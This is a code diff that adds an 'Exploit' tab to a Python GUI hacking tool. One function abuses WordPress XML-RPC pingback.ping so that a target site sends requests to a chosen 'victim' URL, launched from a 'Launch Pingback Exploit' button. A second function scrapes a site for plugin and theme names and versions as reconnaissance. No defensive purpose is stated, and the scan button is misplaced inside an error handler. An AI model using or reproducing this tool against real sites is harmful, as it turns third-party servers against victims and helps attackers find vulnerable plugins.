@@ -279,3 +279,91 @@ def run_dir_scan():
         t.join()
 
     scanner_output.insert("end", "[*] Dir scan finished.\n")
+
+# ===============
+# === Exploit TAB
+# ===============
+from urllib.parse import urljoin
+import re
+import xmlrpc.client
+def run_pingback_exploit():
+    xmlrpc_url = exploit_target_entry.get().strip()
+    victim_url = exploit_victim_entry.get().strip()
+
+    if not xmlrpc_url or not victim_url:
+        messagebox.showerror("Error", "Fill in both target and victim URLs.")
+        return
+
+    exploit_output.delete("0.0", "end")
+    exploit_output.insert("end", f"[*] Sending pingback from {xmlrpc_url} to {victim_url}\n")
+
+    try:
+        proxy = xmlrpc.client.ServerProxy(xmlrpc_url)
+        result = proxy.pingback.ping(victim_url, xmlrpc_url)
+        exploit_output.insert("end", f"[+] Pingback response: {result}\n")
+    except xmlrpc.client.Fault as fault:
+        exploit_output.insert("end", f"[-] Fault: {fault.faultString}\n")
+    except Exception as e:
+        exploit_output.insert("end", f"[!] Error: {e}\n")
+ctk.CTkLabel(exploit_tab, text="Target XML-RPC URL").pack(pady=5)
+exploit_target_entry = ctk.CTkEntry(exploit_tab, width=700)
+exploit_target_entry.insert(0, "https://example.com/xmlrpc.php")
+exploit_target_entry.pack()
+
+ctk.CTkLabel(exploit_tab, text="Victim URL to Ping").pack(pady=5)
+exploit_victim_entry = ctk.CTkEntry(exploit_tab, width=700)
+exploit_victim_entry.insert(0, "http://victim.com")
+exploit_victim_entry.pack()
+
+ctk.CTkButton(exploit_tab, text="Launch Pingback Exploit",
+              command=lambda: threading.Thread(target=run_pingback_exploit).start()).pack(pady=10)
+
+exploit_output = ctk.CTkTextbox(exploit_tab, height=300, width=800)
+exploit_output.pack()
+def run_wp_asset_enum():
+    url = exploit_target_entry.get().strip()
+    if not url.startswith("http"):
+        messagebox.showerror("Error", "Enter a valid WordPress URL (with http/https).")
+        return
+
+    exploit_output.delete("0.0", "end")
+    exploit_output.insert("end", f"[*] Scanning {url} for plugins and themes...\n")
+
+    try:
+        r = requests.get(url, timeout=10)
+        html = r.text
+
+        # Detect Plugins
+        plugin_matches = re.findall(r'/wp-content/plugins/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
+        plugin_set = {match[0] for match in plugin_matches}
+
+        # Detect Themes
+        theme_matches = re.findall(r'/wp-content/themes/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
+        theme_set = {match[0] for match in theme_matches}
+
+        if plugin_set:
+            exploit_output.insert("end", "\n[+] Plugins Found:\n")
+            for plugin in plugin_set:
+                version = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
+                if version:
+                    exploit_output.insert("end", f" - {plugin} (ver {version.group(1)})\n")
+                else:
+                    exploit_output.insert("end", f" - {plugin}\n")
+        else:
+            exploit_output.insert("end", "[-] No plugins found.\n")
+
+        if theme_set:
+            exploit_output.insert("end", "\n[+] Themes Found:\n")
+            for theme in theme_set:
+                version = re.search(rf'/wp-content/themes/{theme}.*?[?&]ver=([0-9\.]+)', html)
+                if version:
+                    exploit_output.insert("end", f" - {theme} (ver {version.group(1)})\n")
+                else:
+                    exploit_output.insert("end", f" - {theme}\n")
+        else:
+            exploit_output.insert("end", "[-] No themes found.\n")
+
+    except Exception as e:
+        exploit_output.insert("end", f"[!] Failed to scan: {e}\n")
+        ctk.CTkButton(exploit_tab, text="Scan Plugins & Themes",
+              command=lambda: threading.Thread(target=run_wp_asset_enum).start()).pack(pady=5)
